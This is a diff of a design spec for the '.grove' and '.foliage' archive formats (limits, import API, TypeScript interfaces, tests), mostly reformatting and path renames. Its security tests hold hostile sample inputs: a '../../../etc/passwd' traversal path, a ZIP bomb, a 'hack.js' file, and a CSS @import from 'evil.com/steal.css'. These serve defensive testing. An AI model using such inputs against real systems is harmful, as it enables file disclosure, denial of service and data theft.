-| Max total extracted size | 4 GB (.grove), 50 MB (.foliage) | Prevents decompression bombs |
-| Max compression ratio | 100:1 | Flags suspicious entries |
-| Max file count | 10,000 (.grove), 50 (.foliage) | Prevents directory exhaustion |
-| Max path depth | 10 levels | Prevents deeply nested paths |
+| Limit                    | Value                           | Rationale                     |
+| ------------------------ | ------------------------------- | ----------------------------- |
+| Max archive size         | 2 GB (.grove), 20 MB (.foliage) | Prevents storage exhaustion   |
+| Max individual file      | 500 MB                          | Largest reasonable media file |
+| Max total extracted size | 4 GB (.grove), 50 MB (.foliage) | Prevents decompression bombs  |
+| Max compression ratio    | 100:1                           | Flags suspicious entries      |
+| Max file count           | 10,000 (.grove), 50 (.foliage)  | Prevents directory exhaustion |
+| Max path depth           | 10 levels                       | Prevents deeply nested paths  |
 
 ```typescript
-function checkCompressionRatio(
-  compressedSize: number,
-  uncompressedSize: number
-): boolean {
-  if (compressedSize === 0) return false;
-  return (uncompressedSize / compressedSize) <= 100;
+function checkCompressionRatio(compressedSize: number, uncompressedSize: number): boolean {
+	if (compressedSize === 0) return false;
+	return uncompressedSize / compressedSize <= 100;
 }
 ```
 
@@ -1013,20 +1021,21 @@ Custom CSS in `.foliage` files is sanitized before application:
 
 The import endpoint (`/api/import`) has additional protections:
 
-| Measure | Implementation |
-|---------|---------------|
-| CSRF validation | `validateCSRF(request)` on POST |
-| Authentication | `locals.user` required |
+| Measure             | Implementation                                              |
+| ------------------- | ----------------------------------------------------------- |
+| CSRF validation     | `validateCSRF(request)` on POST                             |
+| Authentication      | `locals.user` required                                      |
 | Tenant verification | `getVerifiedTenantId()` — can only import to your own grove |
-| Rate limiting | Extend existing export rate limiter (10/hour) |
-| Audit logging | Log to `audit_log` with category `data_import` |
-| Size validation | Check archive size before extraction |
-| Content validation | Validate manifest, check format version |
-| Media scanning | Validate MIME types match file contents (magic bytes) |
+| Rate limiting       | Extend existing export rate limiter (10/hour)               |
+| Audit logging       | Log to `audit_log` with category `data_import`              |
+| Size validation     | Check archive size before extraction                        |
+| Content validation  | Validate manifest, check format version                     |
+| Media scanning      | Validate MIME types match file contents (magic bytes)       |
 
 ### No Executable Code
 
 Both formats explicitly forbid:
+
 - JavaScript files (`.js`, `.mjs`, `.cjs`)
 - HTML files (except in `.grove` HTML export conversion output)
 - Server-side scripts (`.php`, `.py`, `.rb`, `.sh`)
@@ -1040,7 +1049,8 @@ If any forbidden file type is found during extraction, the entire archive is rej
 ## Implementation Phases
 
 ### Phase 1: Core Library
-*`packages/grove-format/` with .grove and .foliage read/write*
+
+_`libs/grove-format/` with .grove and .foliage read/write_
 
 - Set up package with fflate dependency
 - Implement ZIP creation with manifest-first pattern
@@ -1050,7 +1060,8 @@ If any forbidden file type is found during extraction, the entire archive is rej
 - Comprehensive test suite (round-trip, security, edge cases)
 
 ### Phase 2: Export Integration
-*Wire into existing `/api/export` with new format option*
+
+_Wire into existing `/api/export` with new format option_
 
 - Add `format: "grove"` option to existing export request body
 - Download media from R2 into ZIP during export
@@ -1059,13 +1070,14 @@ If any forbidden file type is found during extraction, the entire archive is rej
 - Extend rate limiting for larger exports (ZIP takes longer)
 - Update audit logging with new format type
 
-**Modified:** `packages/engine/src/routes/api/export/+server.ts`
-**Added:** `packages/engine/package.json` (grove-format dependency)
+**Modified:** `libs/engine/src/routes/api/export/+server.ts`
+**Added:** `libs/engine/package.json` (grove-format dependency)
 
 ### Phase 3: Public Viewer
-*`grove.place/open` client-side viewer*
 
-- Build viewer page at `packages/landing/src/routes/open/+page.svelte`
+_`grove.place/open` client-side viewer_
+
+- Build viewer page at `apps/landing/src/routes/open/+page.svelte`
 - Implement drag-and-drop with file validation
 - Client-side ZIP extraction in Web Worker
 - Post/page browser with Markdown rendering
@@ -1074,7 +1086,8 @@ If any forbidden file type is found during extraction, the entire archive is rej
 - PWA file_handlers in manifest.json
 
 ### Phase 4: Import
-*New `/api/import` endpoint for .grove files*
+
+_New `/api/import` endpoint for .grove files_
 
 - Build `/api/import` POST endpoint
 - Parse and validate uploaded `.grove` file
@@ -1086,7 +1099,8 @@ If any forbidden file type is found during extraction, the entire archive is rej
 - Import progress tracking (for large archives)
 
 ### Phase 5: Standard Formats
-*Markdown ZIP and HTML archive converters*
+
+_Markdown ZIP and HTML archive converters_
 
 - `groveToMarkdown()` — transform, date-prefix, generate README
 - `groveToHTML()` — render markdown, wrap in templates, generate index
@@ -1094,7 +1108,8 @@ If any forbidden file type is found during extraction, the entire archive is rej
 - `grove.css` minimal stylesheet
 
 ### Phase 6: Foliage Integration
-*Wire .foliage into Foliage system and future Terrarium*
+
+_Wire .foliage into Foliage system and future Terrarium_
 
 - Export community themes as `.foliage` files
 - Import `.foliage` files as community themes
@@ -1103,7 +1118,8 @@ If any forbidden file type is found during extraction, the entire archive is rej
 - Theme round-trip validation
 
 ### Phase 7: OS Integration
-*PWA file_handlers, custom icons, MIME registration*
+
+_PWA file_handlers, custom icons, MIME registration_
 
 - Custom file icons for `.grove` and `.foliage`
 - PWA `file_handlers` registration (Phase 3 starts this)
@@ -1119,89 +1135,89 @@ If any forbidden file type is found during extraction, the entire archive is rej
 
 ```typescript
 /** Supported Grove file format types */
-type GroveFormatType = 'grove' | 'foliage';
+type GroveFormatType = "grove" | "foliage";
 
 /** Options for creating a .grove file */
 interface CreateGroveOptions {
-  /** Tenant data from D1 */
-  tenant: {
-    subdomain: string;
-    displayName: string;
-    plan: string;
-  };
-  /** Posts to include (Markdown + metadata) */
-  posts: GrovePost[];
-  /** Pages to include */
-  pages: GrovePage[];
-  /** Media files to include (binary data + metadata) */
-  media: GroveMediaFile[];
-  /** Theme settings */
-  theme?: GroveThemeExport;
-  /** Site settings from tenant_settings */
-  siteSettings?: Record<string, unknown>;
-  /** Curio configurations (non-secret fields only) */
-  curios?: Record<string, unknown>;
+	/** Tenant data from D1 */
+	tenant: {
+		subdomain: string;
+		displayName: string;
+		plan: string;
+	};
+	/** Posts to include (Markdown + metadata) */
+	posts: GrovePost[];
+	/** Pages to include */
+	pages: GrovePage[];
+	/** Media files to include (binary data + metadata) */
+	media: GroveMediaFile[];
+	/** Theme settings */
+	theme?: GroveThemeExport;
+	/** Site settings from tenant_settings */
+	siteSettings?: Record<string, unknown>;
+	/** Curio configurations (non-secret fields only) */
+	curios?: Record<string, unknown>;
 }
 
 /** A post as represented in a .grove file */
 interface GrovePost {
-  slug: string;
-  title: string;
-  description: string | null;
-  content: string;
-  status: 'draft' | 'published' | 'archived';
-  tags: string[];
-  featuredImage: string | null;
-  wordCount: number;
-  readingTime: number;
-  gutterContent: unknown[];
-  publishedAt: string | null;
-  createdAt: string;
-  updatedAt: string;
+	slug: string;
+	title: string;
+	description: string | null;
+	content: string;
+	status: "draft" | "published" | "archived";
+	tags: string[];
+	featuredImage: string | null;
+	wordCount: number;
+	readingTime: number;
+	gutterContent: unknown[];
+	publishedAt: string | null;
+	createdAt: string;
+	updatedAt: string;
 }
 
 /** A page as represented in a .grove file */
 interface GrovePage {
-  slug: string;
-  title: string;
-  description: string | null;
-  content: string;
-  type: string;
-  font: string;
-  hero: unknown | null;
-  gutterContent: unknown[];
-  createdAt: string;
-  updatedAt: string;
+	slug: string;
+	title: string;
+	description: string | null;
+	content: string;
+	type: string;
+	font: string;
+	hero: unknown | null;
+	gutterContent: unknown[];
+	createdAt: string;
+	updatedAt: string;
 }
 
 /** A media file with binary data for inclusion in archive */
 interface GroveMediaFile {
-  filename: string;
-  originalName: string;
-  path: string;
-  data: Uint8Array;
-  size: number;
-  mimeType: string;
-  altText: string | null;
-  width: number | null;
-  height: number | null;
-  uploadedAt: string;
+	filename: string;
+	originalName: string;
+	path: string;
+	data: Uint8Array;
+	size: number;
+	mimeType: string;
+	altText: string | null;
+	width: number | null;
+	height: number | null;
+	uploadedAt: string;
 }
 
 /** Theme data exported in a .grove file */
 interface GroveThemeExport {
-  settings: ThemeSettings;
-  thumbnail: Uint8Array | null;
-  customFonts: GroveCustomFont[];
+	settings: ThemeSettings;
+	thumbnail: Uint8Array | null;
+	customFonts: GroveCustomFont[];
 }
 
 /** A custom font bundled in the archive */
 interface GroveCustomFont {
-  name: string;
-  family: string;
-  category: 'sans-serif' | 'serif' | 'mono' | 'display';
-  data: Uint8Array;
-  fileSize: number;
+	name: string;
+	family: string;
+	category: "sans-serif" | "serif" | "mono" | "display";
+	data: Uint8Array;
+	fileSize: number;
 }
 ```
 
@@ -1210,62 +1226,62 @@ interface GroveCustomFont {
 ```typescript
 /** .grove manifest (manifest.grove) */
 interface GroveManifest {
-  format: 'grove';
-  formatVersion: string;
-  minReaderVersion: string;
-  generatedBy: string;
-  createdAt: string;
+	format: "grove";
+	formatVersion: string;
+	minReaderVersion: string;
+	generatedBy: string;
+	createdAt: string;
 
-  grove: {
-    subdomain: string;
-    displayName: string;
-    plan: string;
-  };
+	grove: {
+		subdomain: string;
+		displayName: string;
+		plan: string;
+	};
 
-  contents: {
-    posts: number;
-    pages: number;
-    mediaFiles: number;
-    mediaBytes: number;
-    customFonts: number;
-    curios: string[];
-  };
+	contents: {
+		posts: number;
+		pages: number;
+		mediaFiles: number;
+		mediaBytes: number;
+		customFonts: number;
+		curios: string[];
+	};
 
-  checksums: {
-    algorithm: 'sha256';
-    manifest: string;
-    contentIndex?: string;
-  };
+	checksums: {
+		algorithm: "sha256";
+		manifest: string;
+		contentIndex?: string;
+	};
 }
 
 /** .foliage manifest (manifest.foliage) */
 interface FoliageManifest {
-  format: 'foliage';
-  formatVersion: string;
-  minReaderVersion: string;
-  generatedBy: string;
-  createdAt: string;
+	format: "foliage";
+	formatVersion: string;
+	minReaderVersion: string;
+	generatedBy: string;
+	createdAt: string;
 
-  theme: {
-    id: string;
-    name: string;
-    description: string;
-    tags: string[];
-    baseTheme?: string;
-  };
+	theme: {
+		id: string;
+		name: string;
+		description: string;
+		tags: string[];
+		baseTheme?: string;
+	};
 
-  contents: {
-    hasCustomCSS: boolean;
-    customCSSBytes: number;
-    customFonts: number;
-    screenshots: number;
-    hasThumbnail: boolean;
-  };
+	contents: {
+		hasCustomCSS: boolean;
+		customCSSBytes: number;
+		customFonts: number;
+		screenshots: number;
+		hasThumbnail: boolean;
+	};
 
-  checksums: {
-    algorithm: 'sha256';
-    manifest: string;
-  };
+	checksums: {
+		algorithm: "sha256";
+		manifest: string;
+	};
 }
 ```
 
@@ -1274,51 +1290,51 @@ interface FoliageManifest {
 ```typescript
 /** Result of parsing a .grove file */
 interface ParsedGroveFile {
-  manifest: GroveManifest;
-  posts: GrovePost[];
-  pages: GrovePage[];
-  media: GroveMediaEntry[];
-  theme: ParsedTheme | null;
-  siteSettings: Record<string, unknown>;
-  curios: Record<string, unknown>;
-  exportInfo: ExportInfo;
+	manifest: GroveManifest;
+	posts: GrovePost[];
+	pages: GrovePage[];
+	media: GroveMediaEntry[];
+	theme: ParsedTheme | null;
+	siteSettings: Record<string, unknown>;
+	curios: Record<string, unknown>;
+	exportInfo: ExportInfo;
 }
 
 /** Media entry from parsed archive (binary data loaded on demand) */
 interface GroveMediaEntry {
-  filename: string;
-  originalName: string;
-  path: string;
-  size: number;
-  mimeType: string;
-  altText: string | null;
-  width: number | null;
-  height: number | null;
-  uploadedAt: string;
-  /** Retrieve the binary data (lazy — only loaded when accessed) */
-  getData: () => Promise<Uint8Array>;
+	filename: string;
+	originalName: string;
+	path: string;
+	size: number;
+	mimeType: string;
+	altText: string | null;
+	width: number | null;
+	height: number | null;
+	uploadedAt: string;
+	/** Retrieve the binary data (lazy — only loaded when accessed) */
+	getData: () => Promise<Uint8Array>;
 }
 
 /** Result of parsing a .foliage file */
 interface ParsedFoliageFile {
-  manifest: FoliageManifest;
-  theme: Theme;
-  customCSS: string | null;
-  fonts: FoliageFont[];
-  thumbnail: Uint8Array;
-  screenshots: Uint8Array[];
-  author: FoliageAuthor;
-  compatibility: FoliageCompatibility;
+	manifest: FoliageManifest;
+	theme: Theme;
+	customCSS: string | null;
+	fonts: FoliageFont[];
+	thumbnail: Uint8Array;
+	screenshots: Uint8Array[];
+	author: FoliageAuthor;
+	compatibility: FoliageCompatibility;
 }
 
 /** Options for parsing */
 interface ParseOptions {
-  /** Skip media binary extraction (for quick manifest inspection) */
-  manifestOnly?: boolean;
-  /** Maximum total extraction size in bytes */
-  maxTotalSize?: number;
-  /** Validate checksums during extraction */
-  validateChecksums?: boolean;
+	/** Skip media binary extraction (for quick manifest inspection) */
+	manifestOnly?: boolean;
+	/** Maximum total extraction size in bytes */
+	maxTotalSize?: number;
+	/** Validate checksums during extraction */
+	validateChecksums?: boolean;
 }
 ```
 
@@ -1327,73 +1343,73 @@ interface ParseOptions {
 ```typescript
 /** Full theme definition (matches Foliage spec) */
 interface Theme {
-  id: string;
-  name: string;
-  description: string;
-  thumbnail: string;
-  tier: 'seedling' | 'sapling';
+	id: string;
+	name: string;
+	description: string;
+	thumbnail: string;
+	tier: "seedling" | "sapling";
 
-  colors: ThemeColors;
-  fonts: ThemeFonts;
-  layout: ThemeLayout;
-  glass?: ThemeGlass;
-  seasonal?: ThemeSeasonal;
-  customCSS?: string;
+	colors: ThemeColors;
+	fonts: ThemeFonts;
+	layout: ThemeLayout;
+	glass?: ThemeGlass;
+	seasonal?: ThemeSeasonal;
+	customCSS?: string;
 }
 
 interface ThemeColors {
-  background: string;
-  surface: string;
-  foreground: string;
-  foregroundMuted: string;
-  accent: string;
-  border: string;
+	background: string;
+	surface: string;
+	foreground: string;
+	foregroundMuted: string;
+	accent: string;
+	border: string;
 }
 
 interface ThemeFonts {
-  heading: string;
-  body: string;
-  mono: string;
+	heading: string;
+	body: string;
+	mono: string;
 }
 
 interface ThemeLayout {
-  type: 'sidebar' | 'no-sidebar' | 'centered' | 'full-width' | 'grid' | 'masonry';
-  maxWidth: string;
-  spacing: 'compact' | 'comfortable' | 'spacious';
+	type: "sidebar" | "no-sidebar" | "centered" | "full-width" | "grid" | "masonry";
+	maxWidth: string;
+	spacing: "compact" | "comfortable" | "spacious";
 }
 
 interface ThemeGlass {
-  enabled: boolean;
-  opacity: number;
-  blur: number;
+	enabled: boolean;
+	opacity: number;
+	blur: number;
 }
 
 interface ThemeSeasonal {
-  enabled: boolean;
-  variants: Record<string, Partial<ThemeColors>>;
+	enabled: boolean;
+	variants: Record<string, Partial<ThemeColors>>;
 }
 
 interface ThemeSettings {
-  tenantId: string;
-  themeId: string;
-  accentColor: string;
-  customizerEnabled: boolean;
-  customColors?: Partial<ThemeColors>;
-  customTypography?: Partial<ThemeFonts>;
-  customLayout?: Partial<ThemeLayout>;
-  customCSS?: string;
-  communityThemeId?: string;
+	tenantId: string;
+	themeId: string;
+	accentColor: string;
+	customizerEnabled: boolean;
+	customColors?: Partial<ThemeColors>;
+	customTypography?: Partial<ThemeFonts>;
+	customLayout?: Partial<ThemeLayout>;
+	customCSS?: string;
+	communityThemeId?: string;
 }
 
 interface CustomFont {
-  id: string;
-  tenantId: string;
-  name: string;
-  family: string;
-  category: 'sans-serif' | 'serif' | 'mono' | 'display';
-  woff2Path: string;
-  woffPath?: string;
-  fileSize: number;
+	id: string;
+	tenantId: string;
+	name: string;
+	family: string;
+	category: "sans-serif" | "serif" | "mono" | "display";
+	woff2Path: string;
+	woffPath?: string;
+	fileSize: number;
 }
 ```
 
@@ -1403,21 +1419,22 @@ interface CustomFont {
 
 ### Existing Export API
 
-**File:** `packages/engine/src/routes/api/export/+server.ts`
+**File:** `libs/engine/src/routes/api/export/+server.ts`
 
 The existing export API returns JSON only. Phase 2 extends it:
 
 ```typescript
 // Extended ExportRequest
 interface ExportRequest {
-  type: ExportType;           // "full" | "posts" | "media" | "pages"
-  format?: ExportFormat;      // "json" | "grove" | "markdown-zip" | "html-archive"
+	type: ExportType; // "full" | "posts" | "media" | "pages"
+	format?: ExportFormat; // "json" | "grove" | "markdown-zip" | "html-archive"
 }
 
-type ExportFormat = 'json' | 'grove' | 'markdown-zip' | 'html-archive';
+type ExportFormat = "json" | "grove" | "markdown-zip" | "html-archive";
 ```
 
 When `format` is `"grove"`:
+
 1. Query posts, pages, media metadata from D1 (same as today)
 2. Download media binaries from R2 (new — current export skips this)
 3. Query theme settings and curio configs (new)
@@ -1427,19 +1444,19 @@ When `format` is `"grove"`:
 ```typescript
 // New response for .grove format
 return new Response(groveZipBuffer, {
-  status: 200,
-  headers: {
-    'Content-Type': 'application/x-grove',
-    'Content-Disposition': `attachment; filename="${subdomain}.grove"`,
-    'Cache-Control': 'no-cache',
-    ...rateLimitHeaders(rateLimitResult, EXPORT_RATE_LIMIT.limit),
-  },
+	status: 200,
+	headers: {
+		"Content-Type": "application/x-grove",
+		"Content-Disposition": `attachment; filename="${subdomain}.grove"`,
+		"Cache-Control": "no-cache",
+		...rateLimitHeaders(rateLimitResult, EXPORT_RATE_LIMIT.limit),
+	},
 });
 ```
 
 ### New Import API
 
-**File:** `packages/engine/src/routes/api/import/+server.ts` (new)
+**File:** `libs/engine/src/routes/api/import/+server.ts` (new)
 
 ```
 POST /api/import
@@ -1449,6 +1466,7 @@ Body: { file: .grove file, strategy: "merge" | "replace" }
 ```
 
 The import endpoint:
+
 1. Validates auth, CSRF, rate limit
 2. Reads uploaded file
 3. Calls `parseGroveFile()` with validation
@@ -1463,8 +1481,9 @@ The import endpoint:
 ### Landing Package
 
 **Files modified:**
-- `packages/landing/src/routes/open/+page.svelte` (new page)
-- `packages/landing/static/manifest.json` (add `file_handlers`)
+
+- `apps/landing/src/routes/open/+page.svelte` (new page)
+- `apps/landing/static/manifest.json` (add `file_handlers`)
 
 The viewer page imports `@autumnsgrove/grove-format` for client-side parsing and uses existing engine UI components for rendering (GlassCard, Markdown renderer, etc.).
 
@@ -1494,72 +1513,70 @@ gw inspect my-grove.grove
 
 ### Unit Tests
 
-| Area | Tests |
-|------|-------|
-| **Manifest** | Schema validation, version comparison, checksum verification |
-| **ZIP creation** | Manifest-first ordering, compression modes, file count limits |
-| **ZIP extraction** | Path validation, size limits, bomb detection, ratio checks |
-| **URL rewriting** | Absolute→relative, relative→absolute, edge cases (no media, nested paths) |
-| **Frontmatter** | YAML serialization round-trip, all field types, null handling |
-| **CSS validation** | Blocked patterns, allowed patterns, size limits |
-| **Font validation** | Magic bytes, size limits, format checks |
-| **Contrast checks** | WCAG AA pass/fail for various color pairs |
-| **Conversion** | Markdown output format, HTML template rendering, README generation |
+| Area                | Tests                                                                     |
+| ------------------- | ------------------------------------------------------------------------- |
+| **Manifest**        | Schema validation, version comparison, checksum verification              |
+| **ZIP creation**    | Manifest-first ordering, compression modes, file count limits             |
+| **ZIP extraction**  | Path validation, size limits, bomb detection, ratio checks                |
+| **URL rewriting**   | Absolute→relative, relative→absolute, edge cases (no media, nested paths) |
+| **Frontmatter**     | YAML serialization round-trip, all field types, null handling             |
+| **CSS validation**  | Blocked patterns, allowed patterns, size limits                           |
+| **Font validation** | Magic bytes, size limits, format checks                                   |
+| **Contrast checks** | WCAG AA pass/fail for various color pairs                                 |
+| **Conversion**      | Markdown output format, HTML template rendering, README generation        |
 
 ### Round-Trip Tests
 
 The most critical test: create a `.grove` file from test data, parse it back, and verify every field matches:
 
 ```typescript
-test('grove round-trip preserves all data', async () => {
-  const original = createTestGroveData();
-  const zipBuffer = await createGroveFile(original);
-  const parsed = await parseGroveFile(zipBuffer);
+test("grove round-trip preserves all data", async () => {
+	const original = createTestGroveData();
+	const zipBuffer = await createGroveFile(original);
+	const parsed = await parseGroveFile(zipBuffer);
 
-  expect(parsed.posts).toEqual(original.posts);
-  expect(parsed.pages).toEqual(original.pages);
-  expect(parsed.siteSettings).toEqual(original.siteSettings);
-  // Media compared by metadata (binary data checked via checksums)
-  expect(parsed.media.map(m => m.filename)).toEqual(
-    original.media.map(m => m.filename)
-  );
+	expect(parsed.posts).toEqual(original.posts);
+	expect(parsed.pages).toEqual(original.pages);
+	expect(parsed.siteSettings).toEqual(original.siteSettings);
+	// Media compared by metadata (binary data checked via checksums)
+	expect(parsed.media.map((m) => m.filename)).toEqual(original.media.map((m) => m.filename));
 });
 ```
 
 Same for `.foliage`:
 
 ```typescript
-test('foliage round-trip preserves theme', async () => {
-  const original = createTestFoliageData();
-  const zipBuffer = await createFoliageFile(original);
-  const parsed = await parseFoliageFile(zipBuffer);
+test("foliage round-trip preserves theme", async () => {
+	const original = createTestFoliageData();
+	const zipBuffer = await createFoliageFile(original);
+	const parsed = await parseFoliageFile(zipBuffer);
 
-  expect(parsed.theme).toEqual(original.theme);
-  expect(parsed.customCSS).toEqual(original.customCSS);
+	expect(parsed.theme).toEqual(original.theme);
+	expect(parsed.customCSS).toEqual(original.customCSS);
 });
 ```
 
 ### Security Tests
 
 ```typescript
-test('rejects path traversal attempts', async () => {
-  const malicious = createZipWithPath('../../../etc/passwd');
-  await expect(parseGroveFile(malicious)).rejects.toThrow('Invalid path');
+test("rejects path traversal attempts", async () => {
+	const malicious = createZipWithPath("../../../etc/passwd");
+	await expect(parseGroveFile(malicious)).rejects.toThrow("Invalid path");
 });
 
-test('rejects ZIP bombs', async () => {
-  const bomb = createZipBomb(1_000_000_000); // 1GB expanded
-  await expect(parseGroveFile(bomb)).rejects.toThrow('exceeds maximum');
+test("rejects ZIP bombs", async () => {
+	const bomb = createZipBomb(1_000_000_000); // 1GB expanded
+	await expect(parseGroveFile(bomb)).rejects.toThrow("exceeds maximum");
 });
 
-test('rejects executable files', async () => {
-  const withScript = createZipWithFile('hack.js', 'alert(1)');
-  await expect(parseGroveFile(withScript)).rejects.toThrow('Forbidden file type');
+test("rejects executable files", async () => {
+	const withScript = createZipWithFile("hack.js", "alert(1)");
+	await expect(parseGroveFile(withScript)).rejects.toThrow("Forbidden file type");
 });
 
-test('sanitizes CSS in foliage', async () => {
-  const theme = createFoliageWithCSS('@import url("https://evil.com/steal.css")');
-  await expect(parseFoliageFile(theme)).rejects.toThrow('CSS validation');
+test("sanitizes CSS in foliage", async () => {
+	const theme = createFoliageWithCSS('@import url("https://evil.com/steal.css")');
+	await expect(parseFoliageFile(theme)).rejects.toThrow("CSS validation");
 });
 ```
 
@@ -1600,28 +1617,28 @@ test('sanitizes CSS in foliage', async () => {
 
 ## Success Metrics
 
-| Metric | Target | Measurement |
-|--------|--------|-------------|
-| **Round-trip fidelity** | 100% | Automated: export → import produces identical content |
-| **Export speed** | < 30s for 100 posts + 50 media files | Benchmark in CI |
-| **Parse speed (browser)** | < 5s for 100 MB .grove file | Performance test in viewer |
-| **Security** | Zero Zip Slip or injection vulnerabilities | Fuzzing + security test suite |
-| **WCAG compliance** | AA for viewer and HTML export | Automated + manual audit |
-| **Format adoption** | 20% of active Wanderers export within 3 months | Analytics |
-| **Viewer engagement** | 50+ unique viewers/month within 6 months | Rings analytics |
+| Metric                    | Target                                         | Measurement                                           |
+| ------------------------- | ---------------------------------------------- | ----------------------------------------------------- |
+| **Round-trip fidelity**   | 100%                                           | Automated: export → import produces identical content |
+| **Export speed**          | < 30s for 100 posts + 50 media files           | Benchmark in CI                                       |
+| **Parse speed (browser)** | < 5s for 100 MB .grove file                    | Performance test in viewer                            |
+| **Security**              | Zero Zip Slip or injection vulnerabilities     | Fuzzing + security test suite                         |
+| **WCAG compliance**       | AA for viewer and HTML export                  | Automated + manual audit                              |
+| **Format adoption**       | 20% of active Wanderers export within 3 months | Analytics                                             |
+| **Viewer engagement**     | 50+ unique viewers/month within 6 months       | Rings analytics                                       |
 
 ---
 
 ## Risks & Mitigations
 
-| Risk | Impact | Mitigation |
-|------|--------|------------|
-| Large media exports timeout on Workers | Export fails for media-heavy groves | Stream ZIP creation, use R2 presigned URLs for large files, consider Durable Object for long exports |
-| Format version drift | Old .grove files can't be imported | Strict `minReaderVersion` checking, migration functions between versions |
-| CSS injection via .foliage | XSS on blogs using community themes | Strict CSS sanitization, CSP headers, sandboxed preview |
-| Malicious .grove files | Data corruption or XSS on import | Full validation pipeline, no raw HTML import, sanitize markdown |
-| Worker memory limits | 128MB Worker limit exceeded by large ZIPs | Streaming extraction with fflate, process media files one at a time |
-| MIME type conflicts | OS associates .grove with another app | Include magic bytes identifier in manifest, document file association |
+| Risk                                   | Impact                                    | Mitigation                                                                                           |
+| -------------------------------------- | ----------------------------------------- | ---------------------------------------------------------------------------------------------------- |
+| Large media exports timeout on Workers | Export fails for media-heavy groves       | Stream ZIP creation, use R2 presigned URLs for large files, consider Durable Object for long exports |
+| Format version drift                   | Old .grove files can't be imported        | Strict `minReaderVersion` checking, migration functions between versions                             |
+| CSS injection via .foliage             | XSS on blogs using community themes       | Strict CSS sanitization, CSP headers, sandboxed preview                                              |
+| Malicious .grove files                 | Data corruption or XSS on import          | Full validation pipeline, no raw HTML import, sanitize markdown                                      |
+| Worker memory limits                   | 128MB Worker limit exceeded by large ZIPs | Streaming extraction with fflate, process media files one at a time                                  |
+| MIME type conflicts                    | OS associates .grove with another app     | Include magic bytes identifier in manifest, document file association                                |
 
 ---
 
